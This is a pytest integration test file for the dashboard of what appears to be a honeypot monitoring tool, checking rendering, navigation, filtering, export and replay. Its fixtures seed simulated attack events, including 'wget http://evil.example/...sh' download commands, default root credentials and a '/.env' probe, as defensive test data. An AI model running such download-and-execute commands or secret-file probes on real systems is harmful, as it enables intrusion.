"""Seeded dashboard smoke and navigation tests.

The dashboard is driven headlessly through Textual's ``run_test`` pilot. These
cover the wiring that renderer-level unit tests cannot: mounting, the
background poll timer while other screens are open, and every documented key
binding. The dashboard is documented to stay usable at 80x24, so it is checked
at both sizes.
"""

from __future__ import annotations

import asyncio
import json
from pathlib import Path

import pytest
from textual.widgets import DataTable

from honeywatch.config import parse_config
from honeywatch.models import Event, EventType, RuleHit, Service, Severity, utcnow
from honeywatch.storage.sqlite import Storage
from honeywatch.tui.app import HoneyWatchTUI
from honeywatch.tui.run import _run_replay_dashboard, replay_context

pytestmark = pytest.mark.integration

ATTACKER = "203.0.113.45"
SIZES = [(100, 30), (80, 24)]


def seed_database(db_path: Path) -> None:
    """Write a small, realistic dataset for the dashboard to display."""
    store = Storage(db_path)
    try:
        for index in range(4):
            store.insert_event(
                Event(
                    ts=utcnow(),
                    service=Service.SSH,
                    event_type=EventType.LOGIN_ATTEMPT,
                    src_ip=ATTACKER,
                    src_port=51000 + index,
                    session_id="tui-seed-01",
                    username="root",
                    password="123456",
                    client_banner="SSH-2.0-libssh_0.9.6",
                    geo_country="CN",
                    geo_city="Shenzhen",
                    as_org="TEST-NET-3",
                ),
                hits=[
                    RuleHit(
                        rule_id="ssh-default-creds-003",
                        attack="T1078.001",
                        severity=Severity.HIGH,
                    )
                ],
            )
        store.insert_event(
            Event(
                ts=utcnow(),
                service=Service.SSH,
                event_type=EventType.COMMAND,
                src_ip=ATTACKER,
                session_id="tui-seed-01",
                command="wget http://evil.example/x.sh",
                geo_country="CN",
            ),
            hits=[
                RuleHit(
                    rule_id="ssh-download-exec-005",
                    attack="T1105",
                    severity=Severity.CRITICAL,
                )
            ],
        )
        store.insert_event(
            Event(
                ts=utcnow(),
                service=Service.HTTP,
                event_type=EventType.HTTP_REQUEST,
                src_ip=ATTACKER,
                path="/.env",
                user_agent="sqlmap/1.7",
                geo_country="CN",
            ),
            hits=[
                RuleHit(
                    rule_id="http-sensitive-path-010",
                    attack="T1595.003",
                    severity=Severity.MEDIUM,
                )
            ],
        )
    finally:
        store.close()


@pytest.fixture
def seeded_db(tmp_path: Path) -> Path:
    db_path = tmp_path / "honeywatch.db"
    seed_database(db_path)
    return db_path


@pytest.mark.parametrize(("width", "height"), SIZES)
async def test_dashboard_mounts_and_renders(seeded_db: Path, width: int, height: int) -> None:
    """The dashboard mounts, populates every table and polls without error."""
    app = HoneyWatchTUI(seeded_db)
    async with app.run_test(size=(width, height)) as pilot:
        await pilot.pause()
        app.poll()

        feed = app.query_one("#feed", DataTable)
        attackers = app.query_one("#attackers", DataTable)
        credentials = app.query_one("#credentials", DataTable)

        assert feed.row_count > 0, "feed table is empty"
        assert attackers.row_count > 0, "attacker table is empty"
        assert credentials.row_count > 0, "credential table is empty"
        assert str(attackers.get_row_at(0)[0]).strip() == ATTACKER


@pytest.mark.parametrize(("width", "height"), SIZES)
async def test_dashboard_survives_polling_with_a_screen_open(
    seeded_db: Path, width: int, height: int
) -> None:
    """The poll timer must not crash the app while another screen is on top.

    ``App.query_one`` resolves against the active screen, so polling the
    dashboard's widgets while a modal or detail screen is displayed would raise
    ``NoMatches`` on the next timer tick.
    """
    app = HoneyWatchTUI(seeded_db, refresh=0.2)
    async with app.run_test(size=(width, height)) as pilot:
        await pilot.pause()
        await pilot.press("question_mark")
        await pilot.pause()
        assert type(app.screen).__name__ == "HelpScreen"

        # Let several poll intervals elapse behind the modal.
        for _ in range(5):
            app.poll()
            await pilot.pause(0.25)
        assert app.is_running

        await pilot.press("escape")
        await pilot.pause()
        assert type(app.screen).__name__ == "Screen"
        app.poll()
        assert app.query_one("#feed", DataTable).row_count > 0, "feed stopped updating"


async def test_dashboard_navigation_paths(seeded_db: Path) -> None:
    """Every documented key binding reaches its screen and back."""
    app = HoneyWatchTUI(seeded_db)
    async with app.run_test(size=(80, 24)) as pilot:
        await pilot.pause()

        await pilot.press("r")
        await pilot.pause()
        assert type(app.screen).__name__ == "RulesScreen"
        assert app.screen.query_one("#rules-table", DataTable).row_count > 0
        await pilot.press("escape")
        await pilot.pause()
        assert type(app.screen).__name__ == "Screen"

        await pilot.press("a")
        await pilot.pause()
        assert type(app.screen).__name__ == "AlertsScreen"
        await pilot.press("escape")
        await pilot.pause()

        await pilot.press("enter")
        await pilot.pause()
        assert type(app.screen).__name__ == "AttackerScreen", (
            "Enter must open the selected attacker (DataTable consumes Enter)"
        )
        assert app.screen.query_one("#detail-header") is not None
        await pilot.press("e")  # export from the detail screen
        await pilot.pause()
        await pilot.press("escape")
        await pilot.pause()
        assert type(app.screen).__name__ == "Screen"


async def test_dashboard_filter_applies_and_clears(seeded_db: Path) -> None:
    """``/`` filters the feed; cancelling clears the filter."""
    app = HoneyWatchTUI(seeded_db)
    async with app.run_test(size=(100, 30)) as pilot:
        await pilot.pause()

        await pilot.press("slash")
        await pilot.pause()
        await pilot.press(*"no-such-token")
        await pilot.press("enter")
        await pilot.pause()
        assert app.filter_text == "no-such-token"
        app.poll()
        assert app.query_one("#feed", DataTable).row_count == 0

        await pilot.press("slash")
        await pilot.pause()
        await pilot.press("escape")
        await pilot.pause()
        assert app.filter_text is None
        app.poll()
        assert app.query_one("#feed", DataTable).row_count > 0


async def test_dashboard_export_writes_report(seeded_db: Path) -> None:
    """``e`` writes a single-attacker report next to the database."""
    app = HoneyWatchTUI(seeded_db)
    async with app.run_test(size=(100, 30)) as pilot:
        await pilot.pause()
        app.poll()
        await pilot.press("e")
        await pilot.pause()

    report = seeded_db.parent / f"report-{ATTACKER}.md"
    assert report.is_file(), "export did not write a report"
    assert ATTACKER in report.read_text(encoding="utf-8")


async def test_dashboard_quit_closes_store(seeded_db: Path) -> None:
    """``q`` exits the dashboard and releases the read-only store."""
    app = HoneyWatchTUI(seeded_db)
    async with app.run_test(size=(100, 30)) as pilot:
        await pilot.pause()
        await pilot.press("q")
        await pilot.pause()
    assert not app.is_running


def write_archive(path: Path, count: int) -> None:
    """Write a raw JSONL archive the replay producer can read."""
    lines = [
        json.dumps(
            Event(
                ts=utcnow(),
                service=Service.SSH,
                event_type=EventType.COMMAND,
                src_ip=ATTACKER,
                session_id="replay-src-1",
                command=f"wget http://evil.example/payload{index}.sh",
            ).model_dump(mode="json")
        )
        for index in range(count)
    ]
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


async def test_replay_demo_actually_replays(tmp_path: Path, rules_dir: Path, monkeypatch) -> None:
    """``tui --replay`` must replay into the temporary database it displays.

    The producer and the pipeline both need the running loop, so a mistake in
    where they are started leaves the demo on a permanently empty dashboard.
    """
    source = tmp_path / "archive.jsonl"
    write_archive(source, 6)
    config = parse_config(
        {
            "data_dir": str(tmp_path / "data"),
            "rules": {"directory": str(rules_dir)},
        },
        base_dir=tmp_path,
    )

    class HeadlessApp:
        """Stand-in dashboard: allows the replay wiring to be driven headlessly."""

        def __init__(self, db_path, *, refresh=1.0, pipeline=None, config=None) -> None:
            self.db_path = Path(db_path)
            self.pipeline = pipeline
            self.config = config

        async def run_async(self) -> None:
            await asyncio.sleep(0.3)

    monkeypatch.setattr("honeywatch.tui.app.HoneyWatchTUI", HeadlessApp)

    with replay_context(source, config, speed=200.0) as ctx:
        await _run_replay_dashboard(ctx, refresh=0.2)
        with Storage(ctx.db_path) as store:
            stats = store.stats()

    assert stats["events"] == 6, "the replay producer never fed the dashboard database"
    assert stats["rule_hits"] > 0, "replayed events were not run through the rule engine"


async def test_dashboard_uses_the_injected_config(
    tmp_path: Path, rules_dir: Path, monkeypatch
) -> None:
    """The dashboard must honour the config the CLI already validated.

    Re-discovering one from the working directory would fail wherever ``-c``
    points at a config outside the current directory.
    """
    db_path = tmp_path / "empty.db"
    Storage(db_path).close()
    config = parse_config(
        {
            "data_dir": str(tmp_path / "data"),
            "rules": {"directory": str(rules_dir)},
        },
        base_dir=tmp_path,
    )
    # No ``config/`` here: the CWD fallback would fail.
    monkeypatch.chdir(tmp_path)

    app = HoneyWatchTUI(db_path, config=config)
    async with app.run_test(size=(80, 24)) as pilot:
        await pilot.pause()
        assert app.ruleset is not None, "rules were not loaded from the injected config"
        assert len(app.ruleset) == 17
